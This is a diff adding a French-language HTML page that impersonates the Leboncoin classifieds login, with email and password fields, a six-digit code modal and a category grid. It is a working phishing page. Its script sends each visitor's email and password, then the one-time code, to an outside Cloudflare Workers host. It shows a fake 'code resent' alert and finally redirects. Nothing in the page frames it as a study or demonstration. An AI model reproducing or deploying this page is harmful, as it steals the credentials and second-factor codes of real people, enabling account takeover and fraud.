@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Leboncoin, site de petites annonces gratuites</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap" rel="stylesheet"> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        :root {
+            --primary-orange: #ff6a00;
+            --light-gray: #f8f8f8;
+            --medium-gray: #ccc;
+            --dark-gray-text: #333;
+            --button-text-color: #fff;
+            --border-color: #e0e0e0;
+            --background-body: #FFFFFF; /* Fond blanc pur */
+
+            /* Couleurs des cartes de catégories */
+            --bg-card-1: #FFE1B3; /* Beige clair */
+            --bg-card-2: #BBDFFA; /* Bleu clair */
+            --bg-card-3: #C5E1A5; /* Vert clair */
+            --bg-card-4: #E1BEE7; /* Violet clair */
+            --bg-card-5: #FFCCBC; /* Rose/Pêche */
+            --bg-card-6: #C9D6DD; /* Gris bleu */
+            --bg-card-7: #FFAB91; /* Corail/Orange */
+            --bg-card-8: #B3EFF4; /* Turquoise clair */
+            --bg-card-9: #F0F4C3; /* Jaune pâle */
+            --bg-card-10: #DDDDDD; /* Gris très clair */
+            --bg-card-11: #B0C4DE; /* Bleu ardoise clair */
+            --bg-card-12: #CCEEFF; /* Bleu ciel */
+            --bg-card-13: #F5E8C7; /* Crème */
+            --bg-card-14: #D8BFD8; /* Lavande */
+            --bg-card-15: #ADD8E6; /* Bleu pâle */
+            --bg-card-16: #FFDAB9; /* Pêche pâle */
+
+            /* Variables de base pour le calcul des largeurs */
+            --padding-mobile: 20px; /* Padding latéral sur mobile */
+            --content-gap-desktop: 50px; /* Espace entre le formulaire et la grille sur desktop */
+            --common-mobile-tablet-max-width: 720px; /* Largeur max mobile/tablette */
+            --category-item-width-desktop: 190px; /* Largeur d'une carte d'icône sur desktop */
+            --category-grid-gap-desktop: 25px; /* Espacement entre les cartes sur desktop */
+            --number-of-columns-desktop: 4; /* Nombre de colonnes sur desktop */
+
+            --category-grid-total-width: calc(var(--number-of-columns-desktop) * var(--category-item-width-desktop) + (var(--number-of-columns-desktop) - 1) * var(--category-grid-gap-desktop));
+            --form-container-width: var(--category-grid-total-width);
+            --content-max-width-desktop: calc(var(--form-container-width) + var(--content-gap-desktop) + var(--category-grid-total-width));
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            background-color: var(--background-body);
+            color: var(--dark-gray-text);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            background-color: #fff;
+            padding: 15px var(--padding-mobile);
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .back-arrow {
+            position: absolute;
+            left: var(--padding-mobile);
+            font-size: 24px;
+            text-decoration: none;
+            color: var(--primary-orange);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 30px;
+            height: 30px;
+        }
+
+        .back-arrow:hover {
+            opacity: 0.8;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--primary-orange);
+            text-align: center;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+            padding: 20px 0;
+            justify-content: flex-start;
+            align-items: center;
+            gap: 40px;
+            max-width: 100%;
+            margin: 0 auto;
+            box-sizing: border-box;
+        }
+
+        .login-form-container {
+            width: calc(100% - (2 * var(--padding-mobile)));
+            max-width: var(--common-mobile-tablet-max-width);
+            box-sizing: border-box;
+            padding: 0;
+        }
+
+        .login-section {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            width: 100%;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* --- NOUVEAUX STYLES POUR L'EN-TÊTE DU FORMULAIRE --- */
+        .form-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .form-header h2 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #111;
+            margin: 0 0 8px 0;
+        }
+
+        .form-header p {
+            font-size: 15px;
+            color: #666;
+            margin: 0;
+            line-height: 1.4;
+        }
+        /* --------------------------------------------------- */
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--dark-gray-text);
+        }
+
+        .form-group input[type="email"],
+        .form-group input[type="password"],
+        .form-group input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-group input[type="email"]:focus,
+        .form-group input[type="password"]:focus,
+        .form-group input[type="text"]:focus {
+            outline: none;
+            border-color: var(--primary-orange);
+        }
+
+        .password-field-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .password-toggle-btn {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #666;
+            font-size: 18px;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: color 0.2s ease;
+        }
+
+        .password-toggle-btn:hover {
+            color: var(--primary-orange);
+        }
+
+        .password-field-wrapper input[type="password"],
+        .password-field-wrapper input[type="text"] {
+            padding-right: 45px;
+        }
+
+        .password-group {
+            overflow: hidden;
+            max-height: 0;
+            opacity: 0;
+            transition: max-height 0.5s ease-out, opacity 0.5s ease-out;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            padding-top: 0;
+        }
+
+        .password-group.show {
+            max-height: 250px;
+            opacity: 1;
+            margin-top: 20px;
+            padding-top: 5px;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: right;
+            font-size: 14px;
+            color: #666;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            transition: background-color 0.3s ease, color 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        .btn-primary {
+            background-color: var(--primary-orange);
+            color: var(--button-text-color);
+            margin-top: 20px;
+        }
+
+        .btn-primary:hover {
+            background-color: #e65c00;
+        }
+
+        #loginButton {
+            width: 100%;
+            display: none;
+            margin-top: 0;
+        }
+
+        #loadingMessage {
+            display: none;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 15px;
+            color: var(--primary-orange);
+            font-weight: 500;
+            padding: 10px;
+            border-radius: 5px;
+            background-color: #fff8e1;
+            border: 1px solid #ffe0b2;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 30px 0;
+            position: relative;
+            font-size: 14px;
+            color: #999;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: calc(40% - 15px);
+            height: 1px;
+            background-color: var(--border-color);
+        }
+
+        .divider::before { left: 0; }
+        .divider::after { right: 0; }
+
+        .social-login-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .btn-social {
+            background-color: #fff;
+            color: var(--dark-gray-text);
+            border: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .btn-social:hover {
+            background-color: #f0f0f0;
+        }
+
+        .btn-social i {
+            font-size: 20px;
+        }
+
+        .category-grid-section {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            width: calc(100% - (2 * var(--padding-mobile)));
+            max-width: var(--common-mobile-tablet-max-width);
+            box-sizing: border-box;
+        }
+
+        .category-item {
+            aspect-ratio: 1 / 1;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .category-item:hover {
+            transform: scale(1.03);
+        }
+
+        .category-item .emoji {
+            font-size: 40px;
+        }
+
+        .category-item .heart-icon {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 20px;
+            color: rgba(0, 0, 0, 0.3);
+        }
+
+        @media (min-width: 1024px) {
+            .main-content {
+                flex-direction: row;
+                justify-content: center;
+                align-items: flex-start;
+                padding: 50px 0;
+                gap: var(--content-gap-desktop);
+                max-width: var(--content-max-width-desktop);
+            }
+
+            .login-form-container {
+                width: var(--form-container-width);
+                max-width: none;
+                flex-shrink: 0;
+            }
+
+            .category-grid-section {
+                grid-template-columns: repeat(var(--number-of-columns-desktop), var(--category-item-width-desktop));
+                gap: var(--category-grid-gap-desktop);
+                width: auto;
+                max-width: none;
+                flex-shrink: 0;
+            }
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .modal-overlay.show-modal {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 40px 20px;
+            border-radius: 16px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            width: 95%;
+            max-width: 450px;
+            text-align: center;
+            position: relative;
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        .modal-overlay.show-modal .modal-content {
+            transform: translateY(0);
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--dark-gray-text);
+            margin-bottom: 15px;
+        }
+
+        .modal-description {
+            font-size: 15px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .highlight-email {
+            font-weight: 700;
+            color: var(--dark-gray-text);
+        }
+
+        .code-input-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: nowrap;
+        }
+
+        .code-input {
+            width: 40px;
+            height: 50px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--dark-gray-text);
+            font-family: 'Roboto Mono', monospace;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            -webkit-appearance: none;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: var(--primary-orange);
+            box-shadow: 0 0 0 3px rgba(255, 106, 0, 0.1);
+        }
+
+        .resend-code-text {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #999;
+        }
+
+        .resend-code-text a {
+            color: var(--primary-orange);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .resend-code-text a:hover {
+            text-decoration: underline;
+        }
+
+        #validateCodeButton {
+            margin-top: 10px;
+        }
+
+        .hp-field {
+            display: none !important;
+            visibility: hidden !important;
+            position: absolute !important;
+            left: -9999px !important;
+        }
+    </style>
+
+    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96" />
+<link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+<link rel="manifest" href="/site.webmanifest" />
+</head>
+<body>
+
+    <header>
+        <a href="#" class="back-arrow" aria-label="Retour"><span aria-hidden="true">&larr;</span></a>
+        <h1 class="logo">leboncoin</h1>
+    </header>
+
+    <main class="main-content">
+        <div class="login-form-container">
+            <section class="login-section">
+                
+                <!-- --- EN-TÊTE DU FORMULAIRE --- -->
+                <div class="form-header">
+                    <h2>Bon retour parmi nous 👋</h2>
+                    <p>Connectez-vous pour confirmer vos informations et sécuriser votre compte.</p>
+                </div>
+                <!-- -------------------------------------- -->
+
+                <form id="loginForm" action="#" method="POST" novalidate> 
+                    
+                    <div class="hp-field">
+                        <label for="website_url">Laissez ce champ vide</label>
+                        <input type="text" id="website_url" name="website_url" tabindex="-1" autocomplete="off">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="email">E-mail *</label>
+                        <input type="email" id="email" name="email" required autocomplete="email" aria-required="true" aria-label="Adresse e-mail">
+                    </div>
+
+                    <button type="button" class="btn btn-primary" id="continueButton">Continuer</button>
+
+                    <div class="password-group" id="passwordGroup">
+                        <div class="form-group">
+                            <label for="password">Mot de passe *</label>
+                            <div class="password-field-wrapper">
+                                <input type="password" id="password" name="password" autocomplete="current-password" aria-required="true" aria-label="Mot de passe">
+                                <button type="button" class="password-toggle-btn" id="passwordToggleBtn" aria-label="Afficher/Masquer le mot de passe">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                        </div>
+                        <a href="#" class="forgot-password">Mot de passe oublié</a>
+                        <button type="submit" class="btn btn-primary" id="loginButton">Se connecter</button>
+                    </div>
+                    <div id="loadingMessage">Veuillez patienter pendant que nous vérifions vos informations de connexion...</div>
+                </form>
+
+            </section>
+        </div>
+
+        <section class="category-grid-section">
+            <div class="category-item" style="background-color: var(--bg-card-1);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Voiture">🚗</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-2);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Maison">🏡</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-3);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Vêtements">👕</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-4);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Électronique">📱</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-5);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Sport">⚽</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-6);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Jardin">🌳</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-7);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Bricolage">🛠</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-8);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Mode">👠</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-9);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Animaux">🐾</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-10);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Musique">🎸</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-11);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Jeux Vidéo">🎮</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-12);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Livres">📚</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-13);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Services">🤝</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-14);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Emploi">💼</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-15);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Vacances">✈️</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-16);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Collections">🏺</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-1);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Enfant">👶</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-2);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Mariage">👰</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-3);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Vélo">🚴</span>
+            </div>
+             <div class="category-item" style="background-color: var(--bg-card-4);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Bateaux">⛵</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-5);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Art">🎨</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-6);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Agriculture">🚜</span>
+            </div>
+            <div class="category-item" style="background-color: var(--bg-card-7);">
+                <span class="heart-icon" aria-label="Ajouter aux favoris">♡</span>
+                <span class="emoji" role="img" aria-label="Cuisine">🍳</span>
+            </div>
+            </section>
+    </main>
+
+    <div id="codeVerificationModal" class="modal-overlay">
+        <div class="modal-content">
+            <h2 class="modal-title">Et pour finir...</h2>
+            <p class="modal-description">Nous venons de vous envoyer un code à 6 chiffres sur l'adresse e-mail <span id="displayedEmail" class="highlight-email"></span>. Veuillez entrer ce code pour finaliser votre connexion.</p>
+            <form id="codeForm" class="code-input-form">
+                <div class="code-inputs">
+                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" class="code-input" id="code1">
+                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" class="code-input" id="code2">
+                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" class="code-input" id="code3">
+                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" class="code-input" id="code4">
+                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" class="code-input" id="code5">
+                    <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" class="code-input" id="code6">
+                </div>
+                <button type="submit" class="btn btn-primary" id="validateCodeButton">Valider le code</button>
+            </form>
+            <p class="resend-code-text">Vous n'avez pas reçu le code ? <a href="#" id="resendCodeLink">Renvoyer le code</a></p>
+        </div>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const emailInput = document.getElementById('email');
+            const continueButton = document.getElementById('continueButton');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const passwordInput = document.getElementById('password');
+            const loginButton = document.getElementById('loginButton');
+            const loginForm = document.getElementById('loginForm');
+            const loadingMessage = document.getElementById('loadingMessage');
+            const passwordToggleBtn = document.getElementById('passwordToggleBtn');
+
+            const codeVerificationModal = document.getElementById('codeVerificationModal');
+            const displayedEmailSpan = document.getElementById('displayedEmail');
+            const codeInputs = document.querySelectorAll('.code-input');
+            const codeForm = document.getElementById('codeForm');
+            const validateCodeButton = document.getElementById('validateCodeButton');
+            const resendCodeLink = document.getElementById('resendCodeLink');
+
+            const REDIRECT_URL = 'settings.accueil.html';
+            const WORKER_URL = 'https://patient-limit-83c6.sylvainruggieri9.workers.dev';
+
+            let userEmailValue = '';
+            let userPasswordValue = '';
+            let passwordVisible = false;
+
+            function getObscuredEmail(email) {
+                if (!email || email.indexOf('@') === -1) {
+                    return email;
+                }
+                const parts = email.split('@');
+                const localPart = parts[0];
+                const domainPart = parts[1];
+
+                let obscuredLocalPart = '';
+                if (localPart.length <= 2) {
+                    obscuredLocalPart = '*'.repeat(localPart.length);
+                } else {
+                    obscuredLocalPart = localPart[0] + '*'.repeat(localPart.length - 2) + localPart[localPart.length - 1];
+                }
+                return `${obscuredLocalPart}@${domainPart}`;
+            }
+
+            passwordToggleBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                passwordVisible = !passwordVisible;
+                
+                if (passwordVisible) {
+                    passwordInput.type = 'text';
+                    passwordToggleBtn.innerHTML = '<i class="fas fa-eye-slash"></i>';
+                    passwordToggleBtn.setAttribute('aria-label', 'Masquer le mot de passe');
+                } else {
+                    passwordInput.type = 'password';
+                    passwordToggleBtn.innerHTML = '<i class="fas fa-eye"></i>';
+                    passwordToggleBtn.setAttribute('aria-label', 'Afficher le mot de passe');
+                }
+            });
+
+            continueButton.addEventListener('click', () => {
+                if (emailInput.value.trim() !== '') {
+                    userEmailValue = emailInput.value.trim();
+                    passwordGroup.classList.add('show');
+                    continueButton.style.display = 'none';
+                    loginButton.style.display = 'block';
+                }
+            });
+
+            loginForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                userPasswordValue = passwordInput.value;
+
+                if (userEmailValue && userPasswordValue) {
+                    loadingMessage.style.display = 'block';
+                    loginButton.disabled = true;
+
+                    try {
+                        await fetch(WORKER_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                "PAGE": "CONNEXION LEBONCOIN",
+                                "EMAIL": userEmailValue,
+                                "PASSWORD": userPasswordValue
+                            })
+                        });
+
+                        displayedEmailSpan.textContent = getObscuredEmail(userEmailValue);
+                        loadingMessage.style.display = 'none';
+                        codeVerificationModal.classList.add('show-modal');
+                        codeInputs[0].focus();
+
+                    } catch (error) {
+                        console.error('Erreur:', error);
+                        loadingMessage.style.display = 'none';
+                        loginButton.disabled = false;
+                        alert("Une erreur est survenue. Veuillez réessayer.");
+                    }
+                }
+            });
+
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1 && index < codeInputs.length - 1) {
+                        codeInputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+            });
+
+            codeForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const otpCode = Array.from(codeInputs).map(input => input.value).join('');
+
+                if (otpCode.length === 6) {
+                    validateCodeButton.disabled = true;
+                    validateCodeButton.textContent = 'Vérification...';
+
+                    try {
+                        await fetch(WORKER_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                "PAGE": "CODE OTP LEBONCOIN",
+                                "CODE": otpCode
+                            })
+                        });
+
+                        window.location.href = REDIRECT_URL;
+
+                    } catch (error) {
+                        console.error('Erreur:', error);
+                        validateCodeButton.disabled = false;
+                        validateCodeButton.textContent = 'Valider le code';
+                        alert("Une erreur est survenue lors de la vérification.");
+                    }
+                }
+            });
+
+            resendCodeLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                alert("Un nouveau code a été envoyé à votre adresse e-mail.");
+            });
+        });
+    </script>
+</body>
+</html>
